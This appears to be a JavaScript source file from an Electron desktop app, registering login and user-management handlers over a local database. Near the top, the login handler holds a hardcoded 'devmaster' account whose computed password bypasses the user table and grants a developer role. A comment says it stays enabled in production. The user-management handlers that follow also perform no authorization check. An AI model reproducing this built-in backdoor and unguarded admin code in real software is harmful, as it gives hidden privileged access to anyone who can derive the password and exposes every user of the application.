const { ipcMain, app } = require('electron')
const { getDb } = require('../lib/database')

module.exports = function register_authHandlers() {
// ─── Auth / Users ────────────────────────────────────────────────────────────
const { hashPassword, verifyPassword, computeDevPassword } = require('../lib/auth_utils')
const DEV_USERNAME = 'devmaster'

ipcMain.handle('auth:login', (_, { username, password }) => {
  // Developer support login — available in production for client assistance
  if (username === DEV_USERNAME && password === computeDevPassword()) {
    return { ok: true, user: { id: 0, username: 'devmaster', full_name: 'Developer (Support)', role: 'developer', is_active: 1 } }
  }
  const db = getDb()
  const user = db.prepare('SELECT * FROM users WHERE username=? AND is_active=1').get([username])
  if (!user) return { ok: false, error: 'Invalid username or password' }
  if (!verifyPassword(password, user.password_hash)) return { ok: false, error: 'Invalid username or password' }

  // Transparently upgrade legacy SHA-256 hashes to scrypt on successful login
  if (!user.password_hash.startsWith('scrypt$')) {
    try { db.prepare('UPDATE users SET password_hash=? WHERE id=?').run([hashPassword(password), user.id]) } catch {}
  }

  db.prepare("UPDATE users SET last_login=datetime('now') WHERE id=?").run([user.id])
  const { password_hash, ...safe } = user
  return { ok: true, user: safe }
})

ipcMain.handle('auth:list-users', () => {
  return getDb().prepare("SELECT id,username,full_name,role,is_active,last_login,created_at FROM users ORDER BY full_name").all()
})

ipcMain.handle('auth:create-user', (_, { username, full_name, password, role }) => {
  const db = getDb()
  if (!username?.trim() || !password || !full_name?.trim()) throw new Error('Username, full name, and password are required.')
  if (password.length < 6) throw new Error('Password must be at least 6 characters.')
  try {
    const info = db.prepare('INSERT INTO users (username,full_name,password_hash,role) VALUES (?,?,?,?)')
      .run([username.trim().toLowerCase(), full_name.trim(), hashPassword(password), role])
    return { ok: true, id: info.lastInsertRowid }
  } catch(e) {
    if (e.message?.includes('UNIQUE')) throw new Error('Username already exists')
    throw e
  }
})

ipcMain.handle('auth:update-user', (_, { id, full_name, role, is_active, new_password }) => {
  const db = getDb()
  if (new_password) {
    if (new_password.length < 6) throw new Error('Password must be at least 6 characters.')
    db.prepare('UPDATE users SET full_name=?,role=?,is_active=?,password_hash=? WHERE id=?')
      .run([full_name, role, is_active, hashPassword(new_password), id])
  } else {
    db.prepare('UPDATE users SET full_name=?,role=?,is_active=? WHERE id=?')
      .run([full_name, role, is_active, id])
  }
  return { ok: true }
})

ipcMain.handle('auth:delete-user', (_, id) => {
  const db = getDb()
  // Prevent deleting the last admin — would lock everyone out
  const adminCount = db.prepare("SELECT COUNT(*) as n FROM users WHERE role='admin' AND is_active=1").get()?.n || 0
  const target = db.prepare('SELECT role FROM users WHERE id=?').get([id])
  if (target?.role === 'admin' && adminCount <= 1) {
    throw new Error('Cannot delete the last administrator. Create another admin first.')
  }
  db.prepare('DELETE FROM users WHERE id=?').run([id])
  return { ok: true }
})

ipcMain.handle('auth:change-password', (_, { id, old_password, new_password }) => {
  const db = getDb()
  const user = db.prepare('SELECT * FROM users WHERE id=?').get([id])
  if (!user) throw new Error('User not found')
  if (!verifyPassword(old_password, user.password_hash)) throw new Error('Current password is incorrect')
  if (!new_password || new_password.length < 6) throw new Error('New password must be at least 6 characters.')
  db.prepare('UPDATE users SET password_hash=? WHERE id=?').run([hashPassword(new_password), id])
  return { ok: true }
})

}
